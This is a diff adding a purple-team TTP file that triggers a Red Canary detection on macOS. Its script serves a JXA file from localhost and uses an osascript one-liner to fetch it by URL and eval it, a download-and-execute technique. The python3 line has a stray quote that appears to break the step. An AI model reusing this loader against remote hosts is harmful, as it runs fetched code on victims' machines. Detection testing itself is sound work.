@@ -1,0 +1,36 @@
+name: Red Canary osascript netconn rule trigger
+api_version: 2.0
+uuid: d92d64d2-5e08-4d6a-8d5e-381cdba51439
+authors:
+  - cedowens
+description: |
+  This TTP tests a Red Canary detector flagging on the osascript binary making netconns. This TTP was developed to run on macOS.
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - TA0002 Execution
+  techniques:
+    - T1059 Command and Scripting Interpreter
+  subtechniques:
+    - T1059.002 AppleScript
+args:
+  - name: timeout
+    description: Timeout for the webserver which briefly hosts the JXA file in seconds.
+    default: 10
+steps:
+  - name: osascript_netconn
+    inline: |
+      echo -e "==> Executing the osascript_netconn TTP...\n"
+      echo "Creating /tmp/purpletest, dropping a JXA file there that simply runs the 'id' command, hosting this file for 10 seconds on localhost usying python3, and then using osascript to inline eval this JXA file..."
+      mkdir -p /tmp/purpletest
+      echo -e "ObjC.import('Cocoa');\nObjC.import('stdlib');\nvar currentApp = Application.currentApplication();\ncurrentApp.includeStandardAdditions = true;\ncurrentApp.doShellScript('id');" > /tmp/purpletest/purple.js
+      cd /tmp/purpletest
+      timeout {{ .Args.timeout }} python3 -m http.server 80 &' && echo "temporary web server started..."
+      osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://127.0.0.1/purple.js')),$.NSUTF8StringEncoding)));" >> /tmp/osascript_netconn.out
+      echo "osascript inline eval completed...now will perform cleanup..."
+    cleanup:
+      inline: |
+        rm -rf /tmp/purpletest /tmp/osascript_netconn.out
+        echo "Cleanup finished. TTP Done!"
